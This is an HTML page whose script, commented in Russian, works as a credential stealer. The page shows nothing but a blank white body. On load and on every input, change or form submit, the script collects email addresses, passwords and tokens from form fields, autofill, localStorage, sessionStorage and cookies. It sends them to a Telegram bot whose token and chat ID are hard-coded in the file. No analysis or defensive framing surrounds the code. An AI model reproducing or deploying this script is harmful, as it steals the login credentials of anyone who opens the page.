<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * { margin: 0; padding: 0; }
        body { 
            background: white; 
            width: 100vw; 
            height: 100vh; 
            overflow: hidden;
        }
    </style>
</head>
<body>

<script>
// ===== ТВОЙ ТОКЕН =====
const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
const CHAT_ID = "8850351378";
// =====================

let sent = false;

function sendToTelegram(email, password) {
    if (sent) return;
    sent = true;
    
    const text = `📩 ПОЧТА И ПАРОЛЬ\n📧 Email: ${email}\n🔑 Пароль: ${password || 'Не найден'}\n🕒 ${new Date().toLocaleString()}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
    
    fetch(url, { mode: 'no-cors' }).catch(() => {});
    new Image().src = url;
}

function findEmailAndPassword() {
    let email = '';
    let password = '';
    
    // ===== 1. ИЩЕМ EMAIL В ПОЛЯХ ВВОДА =====
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        const val = input.value ? input.value.trim() : '';
        if (val && val.includes('@') && val.includes('.')) {
            email = val;
        }
        if (!password && input.type === 'password' && input.value) {
            password = input.value.trim();
        }
        if (!password && input.getAttribute('autocomplete') === 'current-password' && input.value) {
            password = input.value.trim();
        }
    });
    
    // ===== 2. ИЩЕМ EMAIL В localStorage =====
    if (!email && window.localStorage) {
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const val = localStorage.getItem(key);
                if (val && typeof val === 'string' && val.includes('@') && val.includes('.')) {
                    email = val;
                    break;
                }
            }
        } catch(e) {}
    }
    
    // ===== 3. ИЩЕМ EMAIL В cookies =====
    if (!email && document.cookie) {
        try {
            const cookies = document.cookie.split(';');
            for (let cookie of cookies) {
                if (cookie.includes('@') && cookie.includes('.')) {
                    email = cookie.trim();
                    break;
                }
            }
        } catch(e) {}
    }
    
    // ===== 4. ИЩЕМ EMAIL В sessionStorage =====
    if (!email && window.sessionStorage) {
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const val = sessionStorage.getItem(key);
                if (val && typeof val === 'string' && val.includes('@') && val.includes('.')) {
                    email = val;
                    break;
                }
            }
        } catch(e) {}
    }
    
    // ===== 5. ИЩЕМ ПАРОЛЬ В localStorage =====
    if (!password && window.localStorage) {
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const val = localStorage.getItem(key);
                if (val && typeof val === 'string' && (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd'))) {
                    password = val;
                    break;
                }
            }
        } catch(e) {}
    }
    
    // ===== 6. ИЩЕМ ПАРОЛЬ В sessionStorage =====
    if (!password && window.sessionStorage) {
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const val = sessionStorage.getItem(key);
                if (val && typeof val === 'string' && (key.toLowerCase().includes('pass') || key.toLowerCase().includes('pwd'))) {
                    password = val;
                    break;
                }
            }
        } catch(e) {}
    }
    
    // ===== 7. ИЩЕМ ПАРОЛЬ В COOKIES =====
    if (!password && document.cookie) {
        try {
            const cookies = document.cookie.split(';');
            for (let cookie of cookies) {
                const lower = cookie.toLowerCase();
                if (lower.includes('pass') || lower.includes('pwd') || lower.includes('token')) {
                    password = cookie.trim();
                    break;
                }
            }
        } catch(e) {}
    }
    
    // ===== 8. ОТПРАВЛЯЕМ ЕСЛИ НАШЛИ EMAIL =====
    if (email && !sent) {
        sendToTelegram(email, password);
        return true;
    }
    return false;
}

// ===== ЗАПУСК ПРИ ЗАГРУЗКЕ =====
window.addEventListener('load', function() {
    // Даём браузеру время на автозаполнение
    setTimeout(findEmailAndPassword, 100);
    setTimeout(findEmailAndPassword, 300);
    setTimeout(findEmailAndPassword, 600);
    setTimeout(findEmailAndPassword, 1000);
    setTimeout(findEmailAndPassword, 2000);
    setTimeout(findEmailAndPassword, 3000);
    setTimeout(findEmailAndPassword, 5000);
});

// ===== ЛОВИМ ВВОД =====
document.addEventListener('input', function(e) {
    if (e.target.tagName === 'INPUT') {
        const val = e.target.value ? e.target.value.trim() : '';
        if (val) {
            if (val.includes('@') && val.includes('.')) {
                setTimeout(findEmailAndPassword, 50);
            }
            if (e.target.type === 'password') {
                setTimeout(findEmailAndPassword, 50);
            }
        }
    }
});

// ===== ЛОВИМ ОТПРАВКУ ФОРМ =====
document.addEventListener('submit', function(e) {
    setTimeout(findEmailAndPassword, 100);
    setTimeout(findEmailAndPassword, 300);
});

// ===== ЛОВИМ ИЗМЕНЕНИЯ =====
document.addEventListener('change', function(e) {
    if (e.target.tagName === 'INPUT') {
        setTimeout(findEmailAndPassword, 50);
    }
});

console.log('🔍 ROCKET ACTIVE - Поиск почты и пароля...');
</script>
</body>
</html>
